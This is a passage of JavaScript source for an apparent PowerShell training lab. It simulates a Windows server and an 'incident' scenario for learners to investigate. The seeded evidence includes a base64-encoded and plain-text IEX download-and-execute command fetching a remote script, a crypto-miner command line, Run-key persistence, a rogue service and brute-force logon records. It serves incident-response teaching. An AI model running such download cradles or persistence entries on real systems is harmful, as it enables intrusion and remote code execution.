/* sudo learn — Windows-system parts of the pretend server for Module 2: registry (HKLM:/HKCU:), event logs
   (Get-WinEvent), CIM classes (Get-CimInstance), Select-String, Copy/Move/Rename-Item, and the "incident" scenario
   (Initialize-LabScenario incident, run from a lab's prelude) that adds an overnight attack to the evidence. */
(function (root) {
  "use strict";
  var E = root.PSEngine, lib = E.lib;
  var PSObject = E.PSObject, PSDate = E.PSDate, PSHashtable = E.PSHashtable;
  var toStr = E.toStr, toNumber = E.toNumber, toBool = E.toBool, lc = E.lc, obj = E.obj, enumerate = E.enumerate;
  var NOW = Date.UTC(2026, 10, 10, 9, 0, 0);
  function at(h, m, s) { return Date.UTC(2026, 10, 10, h, m, s || 0); }
  function err(msg, cat) { return new E.PSError(msg, { category: cat || "InvalidArgument" }); }
  function list(v) { return v === undefined || v === null ? [] : Array.isArray(v) ? v : [v]; }
  function names(v) { return list(v).map(toStr); }
  function p(name, position, extra) { var o = { name: name, position: position == null ? null : position }; if (extra) for (var k in extra) o[k] = extra[k]; return o; }
  function sw(name) { return { name: name, type: "switch" }; }
  function C(name, module, params, run, help) { lib.cmdlets[lc(name)] = { name: name, module: module, params: params, run: run, help: help || {} }; }
  var MGMT = "Microsoft.PowerShell.Management", UTIL = "Microsoft.PowerShell.Utility", CIM = "CimCmdlets", DIAG = "Microsoft.PowerShell.Diagnostics", LOCAL = "Microsoft.PowerShell.LocalAccounts";
  var ENC = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADYANgAvAGEALgBwAHMAMQAnACkA";

  /* ================================================================== Base data */
  var SERVICE_PATHS = {
    BITS: ["C:\\Windows\\system32\\svchost.exe -k netsvcs -p", "LocalSystem"],
    Dnscache: ["C:\\Windows\\system32\\svchost.exe -k NetworkService -p", "NT AUTHORITY\\NetworkService"],
    EventLog: ["C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p", "NT AUTHORITY\\LocalService"],
    KestrelAgent: ["\"C:\\Program Files\\Kestrel\\kestrel-agent.exe\" --service", "LocalSystem"],
    KestrelUpdater: ["C:\\Program Files\\Kestrel\\Updater\\kupdate.exe --service", "LocalSystem"],
    MSSQLSERVER: ["\"C:\\Program Files\\Microsoft SQL Server\\MSSQL16.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe\" -sMSSQLSERVER", "NT Service\\MSSQLSERVER"],
    RemoteRegistry: ["C:\\Windows\\system32\\svchost.exe -k localService -p", "NT AUTHORITY\\LocalService"],
    Spooler: ["C:\\Windows\\System32\\spoolsv.exe", "LocalSystem"],
    sshd: ["C:\\Windows\\System32\\OpenSSH\\sshd.exe", "LocalSystem"],
    TermService: ["C:\\Windows\\System32\\svchost.exe -k NetworkService", "NT Authority\\NetworkService"],
    W32Time: ["C:\\Windows\\system32\\svchost.exe -k LocalService", "NT AUTHORITY\\LocalService"],
    W3SVC: ["C:\\Windows\\system32\\svchost.exe -k iissvcs", "LocalSystem"],
    WinRM: ["C:\\Windows\\System32\\svchost.exe -k NetworkService -p", "NT AUTHORITY\\NetworkService"],
    wuauserv: ["C:\\Windows\\system32\\svchost.exe -k netsvcs -p", "LocalSystem"]
  };
  function regKey(path, values) { return { path: path, values: Object.keys(values).map(function (k) { return { name: k, value: values[k] }; }) }; }
  function baseRegistry() {
    return [
      regKey("HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", { SecurityHealth: "%windir%\\system32\\SecurityHealthSystray.exe", KestrelAgent: "\"C:\\Program Files\\Kestrel\\kestrel-agent.exe\" --tray" }),
      regKey("HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", {}),
      regKey("HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", { OneDrive: "\"C:\\Users\\dev\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background" }),
      regKey("HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", {}),
      regKey("HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", { ProductName: "Windows Server 2022 Datacenter", CurrentBuild: "20348", DisplayVersion: "21H2", RegisteredOwner: "Kestrel Cloud" }),
      regKey("HKLM:\\SOFTWARE\\Kestrel\\Agent", { Version: "2.4.1", Server: "https://telemetry.kestrel.io", Interval: 60 }),
      regKey("HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server", { fDenyTSConnections: 0 }),
      regKey("HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", { PortNumber: 3389, UserAuthentication: 1, SecurityLayer: 2 }),
      regKey("HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa", { LimitBlankPasswordUse: 1, RunAsPPL: 0 }),
      regKey("HKLM:\\SYSTEM\\CurrentControlSet\\Services\\KestrelAgent", { ImagePath: SERVICE_PATHS.KestrelAgent[0], Start: 2, ObjectName: "LocalSystem" }),
      regKey("HKLM:\\SYSTEM\\CurrentControlSet\\Services\\W3SVC", { ImagePath: SERVICE_PATHS.W3SVC[0], Start: 2, ObjectName: "LocalSystem" })
    ];
  }

  function ev(log, id, time, level, provider, message, props) {
    return { LogName: log, Id: id, time: time, Level: level, ProviderName: provider, Message: message, Props: props || [] };
  }
  var SEC = "Microsoft-Windows-Security-Auditing";
  function propsAt(map, len) { var a = []; for (var i = 0; i < len; i++) a.push(map[i] !== undefined ? map[i] : "-"); return a; }
  function failedLogon(time, user, ip) {
    return ev("Security", 4625, time, 0, SEC, "An account failed to log on.\n\nAccount For Which Logon Failed:\n\tAccount Name:\t\t" + user + "\n\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\nNetwork Information:\n\tSource Network Address:\t" + ip + "\n\tSource Port:\t\t0",
      propsAt({ 5: user, 6: "KC-WIN-01", 10: 10, 19: ip }, 21));
  }
  function logon(time, user, ip, type) {
    return ev("Security", 4624, time, 0, SEC, "An account was successfully logged on.\n\nLogon Information:\n\tLogon Type:\t\t" + type + "\n\nNew Logon:\n\tAccount Name:\t\t" + user + "\n\nNetwork Information:\n\tSource Network Address:\t" + ip,
      propsAt({ 5: user, 6: "KC-WIN-01", 8: type, 18: ip }, 22));
  }
  function baseEvents() {
    return [
      ev("System", 6005, at(1, 0, 0) - 14 * 86400000, 4, "EventLog", "The Event log service was started."),
      logon(at(8, 5, 12), "ana.silva", "10.0.4.31", 10),
      logon(at(8, 30, 40), "dana.park", "10.0.4.20", 2),
      ev("System", 7036, at(8, 31, 2), 4, "Service Control Manager", "The Windows Update service entered the stopped state.", ["Windows Update", "stopped"]),
      ev("Application", 1000, at(7, 45, 0), 2, "Application Error", "Faulting application name: kupdate.exe, version: 1.2.0.0\nException code: 0xc0000005", ["kupdate.exe", "1.2.0.0"]),
      ev("Application", 1001, at(7, 45, 3), 4, "Windows Error Reporting", "Fault bucket 2145, type 0\nEvent Name: APPCRASH", []),
      ev("System", 7031, at(7, 45, 5), 2, "Service Control Manager", "The Kestrel Update Service service terminated unexpectedly. It has done this 3 time(s).", ["Kestrel Update Service", 3])
    ];
  }
  function incidentEvents() {
    var e = [];
    var users = ["Administrator", "admin", "administrator", "dana.park", "backup", "temp.admin", "root", "Administrator", "admin", "user", "test", "temp.admin", "Administrator", "sql"];
    users.forEach(function (u, i) { e.push(failedLogon(at(2, 10, 0) + i * 23000, u, "203.0.113.50")); });
    e.push(logon(at(2, 16, 5), "temp.admin", "203.0.113.50", 10));
    ["guest", "admin", "Administrator", "support"].forEach(function (u, i) { e.push(failedLogon(at(3, 5, 0) + i * 900000, u, "198.51.100.23")); });
    e.push(failedLogon(at(8, 4, 40), "ana.silva", "10.0.4.31"), failedLogon(at(8, 4, 55), "ana.silva", "10.0.4.31"));
    e.push(ev("Security", 4720, at(2, 21, 10), 0, SEC, "A user account was created.\n\nSubject:\n\tAccount Name:\t\ttemp.admin\n\nNew Account:\n\tAccount Name:\t\tsupport_tmp", ["support_tmp", "KC-WIN-01", "S-1-5-21-1001", "S-1-5-21-temp", "temp.admin"]));
    e.push(ev("Security", 4732, at(2, 21, 40), 0, SEC, "A member was added to a security-enabled local group.\n\nSubject:\n\tAccount Name:\t\ttemp.admin\n\nMember:\n\tAccount Name:\t\tsupport_tmp\n\nGroup:\n\tGroup Name:\t\tAdministrators", ["support_tmp", "S-1-5-21-1001", "Administrators", "Builtin", "S-1-5-32-544", "temp.admin"]));
    e.push(ev("System", 7045, at(2, 24, 0), 4, "Service Control Manager", "A service was installed in the system.\n\nService Name:  WinUpdateHelper\nService File Name:  C:\\Users\\Public\\svc.exe\nService Type:  user mode service\nService Start Type:  auto start\nService Account:  LocalSystem", ["WinUpdateHelper", "C:\\Users\\Public\\svc.exe", "user mode service", "auto start", "LocalSystem"]));
    e.push(ev("Microsoft-Windows-PowerShell/Operational", 4104, at(2, 26, 30), 3, "Microsoft-Windows-PowerShell", "Creating Scriptblock text (1 of 1):\nIEX (New-Object Net.WebClient).DownloadString('http://198.51.100.66/a.ps1')\n\nScriptBlock ID: 5d2c-41a0", ["1", "1", "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.66/a.ps1')"]));
    return e;
  }

  lib.systemHooks = lib.systemHooks || [];
  lib.systemHooks.push(function (sys) {
    sys.registry = baseRegistry();
    sys.events = baseEvents();
    sys.services.forEach(function (s) { var sp = SERVICE_PATHS[s.Name] || ["C:\\Windows\\system32\\svchost.exe -k netsvcs", "LocalSystem"]; s.PathName = sp[0]; s.StartName = sp[1]; });
    sys.processes.forEach(function (x) {
      x.Parent = x.Name === "svchost" || x.Name === "lsass" ? 600 : x.Name === "explorer" ? 4800 : x.Name === "pwsh" ? 5120 : 600;
      x.CommandLine = x.Path ? (/\s/.test(x.Path) ? "\"" + x.Path + "\"" : x.Path) : null;
      if (x.Name === "updater") { x.CommandLine = "C:\\Users\\Public\\updater.exe --pool stratum+tcp://203.0.113.9:3333 --threads 4"; x.Parent = 1440; }
      if (x.Name === "svchost") x.CommandLine = "C:\\Windows\\system32\\svchost.exe -k netsvcs -p";
    });
    sys.disks = [{ DeviceID: "C:", Size: 127 * 1073741824, FreeSpace: Math.round(18.4 * 1073741824), VolumeName: "System" }, { DeviceID: "D:", Size: 500 * 1073741824, FreeSpace: Math.round(211.7 * 1073741824), VolumeName: "Data" }];
  });

  function applyScenario(sys, name) {
    if (lc(name) !== "incident") throw err("Unknown lab scenario: " + name);
    sys.scenario = "incident";
    sys.processes.push({ Name: "WINWORD", Id: 6900, CPU: 22.4, WS: 180 * 1048576, Company: "Microsoft Corporation", Path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", Ago: 410, Parent: 5120,
      CommandLine: "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\dev\\Downloads\\Invoice_7731.docm\"" });
    sys.processes.push({ Name: "powershell", Id: 7012, CPU: 3.1, WS: 72 * 1048576, Company: "Microsoft Corporation", Path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", Ago: 40, Parent: 6900,
      CommandLine: "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand " + ENC });
    sys.processes.push({ Name: "svc", Id: 7120, CPU: 0.8, WS: 12 * 1048576, Company: null, Path: "C:\\Users\\Public\\svc.exe", Ago: 395, Parent: 600, CommandLine: "C:\\Users\\Public\\svc.exe" });
    sys.services.push({ Name: "WinUpdateHelper", DisplayName: "Windows Update Helper", Status: "Running", StartType: "Automatic", PathName: "C:\\Users\\Public\\svc.exe", StartName: "LocalSystem" });
    sys.users.push({ Name: "support_tmp", Enabled: true, LastLogon: at(2, 22, 0), Description: "", FullName: "" });
    sys.groups.Administrators.push("support_tmp");
    sys.events = sys.events.concat(incidentEvents());
    var run = regFind(sys, "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    run.values.push({ name: "WindowsUpdateCheck", value: "C:\\Users\\Public\\updater.exe --silent" });
    var hrun = regFind(sys, "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
    hrun.values.push({ name: "AdobeUpdate", value: "powershell.exe -NoP -W Hidden -Enc " + ENC });
    regFind(sys, "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp").values.forEach(function (v) { if (v.name === "UserAuthentication") v.value = 0; });
    sys.registry.push(regKey("HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinUpdateHelper", { ImagePath: "C:\\Users\\Public\\svc.exe", Start: 2, ObjectName: "LocalSystem" }));
  }
  C("Initialize-LabScenario", "SudoLearn", [p("Name", 0)], function (b, input, ctx) { applyScenario(ctx.session.system, toStr(b.name)); return []; });
  lib.reg = { find: function (sys, path) { return regFind(sys, path); }, key: regKey };
  lib.scenarios = { incident: applyScenario };
  lib.cmdlets["initialize-labscenario"].hidden = true;

  /* ================================================================== Registry */
  var HIVES = { "hklm": "HKEY_LOCAL_MACHINE", "hkcu": "HKEY_CURRENT_USER" };
  function isReg(path) { return /^(hklm|hkcu):|^registry::/i.test(toStr(path).trim()); }
  function regNorm(path) {
    var s = toStr(path).trim().replace(/\//g, "\\");
    s = s.replace(/^registry::hkey_local_machine/i, "HKLM:").replace(/^registry::hkey_current_user/i, "HKCU:");
    var m = /^(hklm|hkcu):\\?(.*)$/i.exec(s);
    if (!m) return null;
    var rest = m[2].replace(/\\+$/, "");
    var hive = m[1].toUpperCase();
    return { hive: hive, rest: rest, key: lc(hive + ":\\" + rest).replace(/\\$/, ""), display: hive + ":\\" + rest, native: HIVES[lc(hive)] + (rest ? "\\" + rest : "") };
  }
  function regFind(sys, path) {
    var n = regNorm(path);
    if (!n) return null;
    for (var i = 0; i < sys.registry.length; i++) if (regNorm(sys.registry[i].path).key === n.key) return sys.registry[i];
    return null;
  }
  function regExists(sys, path) {
    var n = regNorm(path);
    if (!n) return false;
    if (n.rest === "") return true;
    return sys.registry.some(function (k) { var kk = regNorm(k.path).key; return kk === n.key || kk.indexOf(n.key + "\\") === 0; });
  }
  function regSubkeys(sys, path) {
    var n = regNorm(path), pSegs = n.rest ? n.rest.split("\\") : [];
    var out = [], seen = {};
    sys.registry.forEach(function (k) {
      var kn = regNorm(k.path);
      if (kn.hive !== n.hive) return;
      var segs = kn.rest ? kn.rest.split("\\") : [];
      if (segs.length <= pSegs.length) return;
      for (var i = 0; i < pSegs.length; i++) if (lc(segs[i]) !== lc(pSegs[i])) return;
      var child = segs[pSegs.length];
      if (seen[lc(child)]) return;
      seen[lc(child)] = true;
      out.push(n.hive + ":\\" + (pSegs.length ? n.rest + "\\" : "") + child);
    });
    return out.sort(function (a, b) { return lc(a) < lc(b) ? -1 : 1; });
  }
  function keyObj(sys, path) {
    var n = regNorm(path), k = regFind(sys, path);
    var vals = k ? k.values : [];
    var o = obj("Microsoft.Win32.RegistryKey", { Name: n.native, PSChildName: n.rest.split("\\").pop() || n.native, Property: vals.map(function (v) { return v.name; }),
      ValueCount: vals.length, SubKeyCount: regSubkeys(sys, path).length, PSPath: "Microsoft.PowerShell.Core\\Registry::" + n.native });
    o.methods = {
      getvalue: function (a) { var v = vals.filter(function (x) { return lc(x.name) === lc(toStr(a[0])); })[0]; return v ? v.value : (a[1] !== undefined ? a[1] : null); },
      getvaluenames: function () { return vals.map(function (v) { return v.name; }); },
      getsubkeynames: function () { return regSubkeys(sys, path).map(function (s) { return s.split("\\").pop(); }); }
    };
    o.toStringFn = function () { return n.native; };
    return o;
  }
  lib.views["Microsoft.Win32.RegistryKey"] = [{ header: "Name", get: function (o) { return o.get("PSChildName"); } }, { header: "Property", get: function (o) { return o.get("Property"); } }];
  function propsObj(sys, path, onlyNames) {
    var n = regNorm(path), k = regFind(sys, path);
    var o = new PSObject();
    (k ? k.values : []).forEach(function (v) { if (!onlyNames || onlyNames.some(function (w) { return E.wildcardRe(w).test(v.name); })) o.set(v.name, v.value); });
    var parent = n.native.slice(0, n.native.lastIndexOf("\\"));
    o.set("PSPath", "Microsoft.PowerShell.Core\\Registry::" + n.native);
    o.set("PSParentPath", "Microsoft.PowerShell.Core\\Registry::" + parent);
    o.set("PSChildName", n.rest.split("\\").pop());
    o.set("PSDrive", n.hive);
    o.set("PSProvider", "Microsoft.PowerShell.Core\\Registry");
    return o;
  }
  function regMissing(ctx, path) { E.writeCmdletError(ctx, "Cannot find path '" + regNorm(path).display + "' because it does not exist.", "ObjectNotFound", path); }

  C("Get-ItemProperty", MGMT, [p("Path", 0), p("Name", 1)], function (b, input, ctx) {
    var sys = ctx.session.system, out = [];
    names(b.path).forEach(function (pth) {
      if (!isReg(pth)) {
        var f = lib.fs.get(sys, pth);
        if (!f) { lib.fs.notFound(ctx, pth); return; }
        out.push(lib.fs.fileObj(sys, lib.fs.normPath(sys, pth).key));
        return;
      }
      if (!regExists(sys, pth)) { regMissing(ctx, pth); return; }
      var only = b.name !== undefined ? names(b.name) : null;
      if (only) {
        var k = regFind(sys, pth) || { values: [] };
        only.forEach(function (nm) {
          if (!/[*?]/.test(nm) && !k.values.some(function (v) { return lc(v.name) === lc(nm); })) E.writeCmdletError(ctx, "Property " + nm + " does not exist at path " + regNorm(pth).native + ".", "InvalidArgument", nm);
        });
        if (!k.values.some(function (v) { return only.some(function (w) { return E.wildcardRe(w).test(v.name); }); })) return;
      }
      out.push(propsObj(sys, pth, only));
    });
    return out;
  }, { synopsis: "Gets the values of a registry key (or a file's properties). Registry values come back as properties of one object, plus PSPath/PSChildName... properties PowerShell adds.",
    examples: ["Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'", "Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Kestrel\\Agent' -Name Version"] });
  lib.aliases["gp"] = "Get-ItemProperty";
  C("Get-ItemPropertyValue", MGMT, [p("Path", 0), p("Name", 1)], function (b, input, ctx) {
    var sys = ctx.session.system, k = regFind(sys, b.path);
    if (!k) { regMissing(ctx, b.path); return []; }
    return names(b.name).map(function (nm) {
      var v = k.values.filter(function (x) { return lc(x.name) === lc(nm); })[0];
      if (!v) throw err("Property " + nm + " does not exist at path " + regNorm(b.path).native + ".", "InvalidArgument");
      return v.value;
    });
  }, { synopsis: "Gets just the value of one registry value, without the PS* extras.", examples: ["Get-ItemPropertyValue 'HKLM:\\SOFTWARE\\Kestrel\\Agent' -Name Version"] });
  function setValue(create) {
    return function (b, input, ctx) {
      var sys = ctx.session.system, k = regFind(sys, b.path);
      if (!isReg(b.path)) throw err("In this lab, " + (create ? "New" : "Set") + "-ItemProperty works on registry paths (HKLM:\\ or HKCU:\\).");
      if (!k) { regMissing(ctx, b.path); return []; }
      var nm = toStr(b.name), ex = k.values.filter(function (v) { return lc(v.name) === lc(nm); })[0];
      if (create && ex && !b.force) { E.writeCmdletError(ctx, "The property already exists.", "ResourceExists", nm); return []; }
      if (ctx.whatIf) { ctx.session.write("What if: Performing the operation \"" + (create ? "New Property" : "Set Property") + "\" on target \"Item: " + regNorm(b.path).native + " Property: " + nm + "\".", "whatif"); return []; }
      var val = b.value;
      if (b.propertytype !== undefined && /dword|qword/i.test(toStr(b.propertytype))) val = toNumber(val);
      if (ex) ex.value = val; else k.values.push({ name: nm, value: val });
      sys.actions.push((create ? "New" : "Set") + "-ItemProperty " + regNorm(b.path).display + " " + nm);
      return b.passthru ? [propsObj(sys, b.path, [nm])] : [];
    };
  }
  C("Set-ItemProperty", MGMT, [p("Path", 0), p("Name", 1), p("Value", 2), p("Type", null, { aliases: ["PropertyType"] }), sw("PassThru"), sw("Force")], setValue(false),
    { synopsis: "Changes (or creates) a registry value. Supports -WhatIf." });
  C("New-ItemProperty", MGMT, [p("Path", 0), p("Name", 1), p("Value", 2), p("PropertyType"), sw("Force"), sw("PassThru")], setValue(true),
    { synopsis: "Creates a registry value. -PropertyType String, DWord, ExpandString..." });
  C("Remove-ItemProperty", MGMT, [p("Path", 0), p("Name", 1), sw("Force")], function (b, input, ctx) {
    var sys = ctx.session.system, k = regFind(sys, b.path);
    if (!k) { regMissing(ctx, b.path); return []; }
    names(b.name).forEach(function (nm) {
      var idx = -1;
      k.values.forEach(function (v, i) { if (lc(v.name) === lc(nm)) idx = i; });
      if (idx < 0) { E.writeCmdletError(ctx, "Property " + nm + " does not exist at path " + regNorm(b.path).native + ".", "InvalidArgument", nm); return; }
      if (ctx.whatIf) { ctx.session.write("What if: Performing the operation \"Remove Property\" on target \"Item: " + regNorm(b.path).native + " Property: " + k.values[idx].name + "\".", "whatif"); return; }
      sys.actions.push("Remove-ItemProperty " + regNorm(b.path).display + " " + k.values[idx].name);
      k.values.splice(idx, 1);
    });
    return [];
  }, { synopsis: "Deletes a registry value. Supports -WhatIf." });

  // Registry paths for Get-ChildItem, Get-Item, Test-Path, New-Item and Remove-Item.
  function wrap(name, regFn) {
    var c = lib.cmdlets[lc(name)], orig = c.run;
    c.run = function (b, input, ctx) {
      var pth = b.path !== undefined ? toStr(list(b.path)[0]) : null;
      if (pth && isReg(pth)) return regFn(b, input, ctx);
      return orig(b, input, ctx);
    };
  }
  wrap("Get-ChildItem", function (b, input, ctx) {
    var sys = ctx.session.system, pth = toStr(list(b.path)[0]);
    if (!regExists(sys, pth)) { regMissing(ctx, pth); return []; }
    var out = [];
    (function walk(p0) {
      regSubkeys(sys, p0).forEach(function (sk) { out.push(keyObj(sys, sk)); if (b.recurse) walk(sk); });
    })(pth);
    return out;
  });
  wrap("Get-Item", function (b, input, ctx) {
    var sys = ctx.session.system, out = [];
    names(b.path).forEach(function (pth) { if (regExists(sys, pth)) out.push(keyObj(sys, pth)); else regMissing(ctx, pth); });
    return out;
  });
  wrap("Test-Path", function (b, input, ctx) { return names(b.path).map(function (pth) { return regExists(ctx.session.system, pth); }); });
  wrap("New-Item", function (b, input, ctx) {
    var sys = ctx.session.system, pth = toStr(b.path);
    if (regExists(sys, pth) && !b.force) { E.writeCmdletError(ctx, "A key at this path already exists.", "ResourceExists", pth); return []; }
    if (ctx.whatIf) { ctx.session.write("What if: Performing the operation \"New Item\" on target \"Item: " + regNorm(pth).native + "\".", "whatif"); return []; }
    if (!regFind(sys, pth)) sys.registry.push(regKey(regNorm(pth).display, {}));
    sys.actions.push("New-Item " + regNorm(pth).display);
    return [keyObj(sys, pth)];
  });
  wrap("Remove-Item", function (b, input, ctx) {
    var sys = ctx.session.system;
    names(b.path).forEach(function (pth) {
      var n = regNorm(pth);
      if (!regExists(sys, pth)) { regMissing(ctx, pth); return; }
      if (ctx.whatIf) { ctx.session.write("What if: Performing the operation \"Remove Key\" on target \"Item: " + n.native + "\".", "whatif"); return; }
      sys.registry = sys.registry.filter(function (k) { var kk = regNorm(k.path).key; return kk !== n.key && kk.indexOf(n.key + "\\") !== 0; });
      sys.actions.push("Remove-Item " + n.display);
    });
    return [];
  });

  /* ================================================================== Event logs */
  var LEVELS = { 0: "Information", 1: "Critical", 2: "Error", 3: "Warning", 4: "Information", 5: "Verbose" };
  function eventObj(e, i) {
    var o = obj("System.Diagnostics.Eventing.Reader.EventLogRecord", { TimeCreated: new PSDate(e.time), Id: e.Id, LevelDisplayName: LEVELS[e.Level] || "Information", Message: e.Message,
      LogName: e.LogName, ProviderName: e.ProviderName, MachineName: "KC-WIN-01", RecordId: 1000 + i, Level: e.Level === 0 ? 0 : e.Level,
      Properties: e.Props.map(function (v) { return obj("System.Diagnostics.Eventing.Reader.EventProperty", { Value: v }); }) });
    return o;
  }
  lib.views["System.Diagnostics.Eventing.Reader.EventLogRecord"] = ["TimeCreated", "Id", "LevelDisplayName", { header: "Message", get: function (o) { return toStr(o.get("Message")).split("\n")[0]; } }];
  C("Get-WinEvent", DIAG, [p("LogName", 0), p("FilterHashtable"), p("MaxEvents"), sw("Oldest"), p("ListLog")], function (b, input, ctx) {
    var sys = ctx.session.system;
    var all = sys.events.map(function (e, i) { return { e: e, i: i }; });
    if (b.listlog !== undefined) {
      var logs = {};
      sys.events.forEach(function (e) { logs[e.LogName] = (logs[e.LogName] || 0) + 1; });
      return Object.keys(logs).sort().filter(function (l) { return E.wildcardRe(toStr(b.listlog)).test(l); }).map(function (l) { return obj("System.Diagnostics.Eventing.Reader.EventLogConfiguration", { LogName: l, RecordCount: logs[l], LogMode: "Circular" }); });
    }
    var f = b.filterhashtable;
    var logNames = b.logname !== undefined ? names(b.logname) : null, ids = null, start = null, end = null, levels = null, providers = null;
    if (f instanceof PSHashtable) {
      f.entries().forEach(function (en) {
        var k = lc(toStr(en.key)), v = en.value;
        if (k === "logname") logNames = names(v);
        else if (k === "id") ids = list(v).map(toNumber);
        else if (k === "starttime") start = E.convertTo(v, "datetime").ms;
        else if (k === "endtime") end = E.convertTo(v, "datetime").ms;
        else if (k === "level") levels = list(v).map(toNumber);
        else if (k === "providername") providers = names(v);
        else throw err("'" + toStr(en.key) + "' isn't a FilterHashtable key in this lab. Use LogName, Id, StartTime, EndTime, Level or ProviderName.");
      });
      if (!logNames) throw err("The FilterHashtable needs a LogName (e.g. @{ LogName = 'Security'; Id = 4625 }).");
    } else if (f !== undefined) throw err("-FilterHashtable needs a hashtable: @{ LogName = 'Security'; Id = 4625 }.");
    if (!logNames) throw err("Say which log to read: Get-WinEvent -LogName Security, or -FilterHashtable @{ LogName = 'Security' ... }.");
    var known = {};
    sys.events.forEach(function (e) { known[lc(e.LogName)] = true; });
    logNames.forEach(function (l) { if (!known[lc(l)] && !/[*?]/.test(l)) E.writeCmdletError(ctx, "There is not an event log on the localhost computer that matches \"" + l + "\".", "ObjectNotFound", l); });
    var hits = all.filter(function (x) {
      var e = x.e;
      if (!logNames.some(function (l) { return E.wildcardRe(l).test(e.LogName); })) return false;
      if (ids && ids.indexOf(e.Id) < 0) return false;
      if (start !== null && e.time < start) return false;
      if (end !== null && e.time > end) return false;
      if (levels && levels.indexOf(e.Level === 0 ? 4 : e.Level) < 0) return false;
      if (providers && !providers.some(function (pv) { return E.wildcardRe(pv).test(e.ProviderName); })) return false;
      return true;
    });
    hits.sort(function (a, c) { return b.oldest ? a.e.time - c.e.time : c.e.time - a.e.time; });
    if (b.maxevents !== undefined) hits = hits.slice(0, toNumber(b.maxevents));
    if (!hits.length) { E.writeCmdletError(ctx, "No events were found that match the specified selection criteria.", "ObjectNotFound"); return []; }
    return hits.map(function (x) { return eventObj(x.e, x.i); });
  }, { synopsis: "Reads Windows event logs. Newest events come first. -FilterHashtable filters inside the log, which is much faster than Where-Object.",
    examples: ["Get-WinEvent -LogName System -MaxEvents 5", "Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4625 }", "Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4624, 4625; StartTime = (Get-Date).AddHours(-12) }"] });

  /* ================================================================== CIM */
  function wql(filter) {
    if (!filter) return function () { return true; };
    var conds = toStr(filter).split(/\s+AND\s+/i).map(function (c) {
      var m = /^\s*(\w+)\s*(=|<>|!=|LIKE)\s*'?([^']*?)'?\s*$/i.exec(c);
      if (!m) throw err("This lab's -Filter understands simple WQL like \"Name = 'svchost.exe'\" or \"Name LIKE '%kestrel%'\" joined with AND.");
      return m;
    });
    return function (o) {
      return conds.every(function (m) {
        var v = toStr(o.get(m[1]) === undefined ? "" : o.get(m[1]));
        var op = m[2].toUpperCase(), want = m[3];
        if (op === "LIKE") return new RegExp("^" + want.replace(/[.*+?^${}()|[\]\\]/g, "\\$&").replace(/%/g, ".*").replace(/_/g, ".") + "$", "i").test(v);
        var eq = lc(v) === lc(want);
        return op === "=" ? eq : !eq;
      });
    };
  }
  function cimClass(cls, sys) {
    var c = lc(cls);
    if (c === "win32_process") return sys.processes.map(function (x) {
      return obj("Microsoft.Management.Infrastructure.CimInstance#root/cimv2/Win32_Process", { ProcessId: x.Id, Name: x.Name + ".exe", ParentProcessId: x.Parent || 4,
        CommandLine: x.CommandLine === undefined ? null : x.CommandLine, ExecutablePath: x.Path, CreationDate: new PSDate(NOW - x.Ago * 60000), WorkingSetSize: x.WS });
    });
    if (c === "win32_service") return sys.services.map(function (s) {
      var proc = sys.processes.filter(function (x) { return lc(x.Name) === lc(s.Name); })[0];
      return obj("Microsoft.Management.Infrastructure.CimInstance#root/cimv2/Win32_Service", { Name: s.Name, DisplayName: s.DisplayName, State: s.Status, StartMode: s.StartType === "Automatic" ? "Auto" : s.StartType,
        PathName: s.PathName, StartName: s.StartName, ProcessId: s.Status === "Running" ? (proc ? proc.Id : 1000 + s.Name.length) : 0 });
    });
    if (c === "win32_operatingsystem") return [obj("Microsoft.Management.Infrastructure.CimInstance#root/cimv2/Win32_OperatingSystem", { Caption: "Microsoft Windows Server 2022 Datacenter", Version: "10.0.20348", BuildNumber: "20348",
      CSName: "KC-WIN-01", LastBootUpTime: new PSDate(NOW - 14 * 86400000 - 8 * 3600000), TotalVisibleMemorySize: 16 * 1048576, FreePhysicalMemory: Math.round(4.2 * 1048576), OSArchitecture: "64-bit" })];
    if (c === "win32_logicaldisk") return sys.disks.map(function (d) { return obj("Microsoft.Management.Infrastructure.CimInstance#root/cimv2/Win32_LogicalDisk", { DeviceID: d.DeviceID, DriveType: 3, VolumeName: d.VolumeName, Size: d.Size, FreeSpace: d.FreeSpace }); });
    if (c === "win32_computersystem") return [obj("Microsoft.Management.Infrastructure.CimInstance#root/cimv2/Win32_ComputerSystem", { Name: "KC-WIN-01", Domain: "WORKGROUP", Manufacturer: "Microsoft Corporation", Model: "Virtual Machine", TotalPhysicalMemory: 16 * 1073741824 })];
    return null;
  }
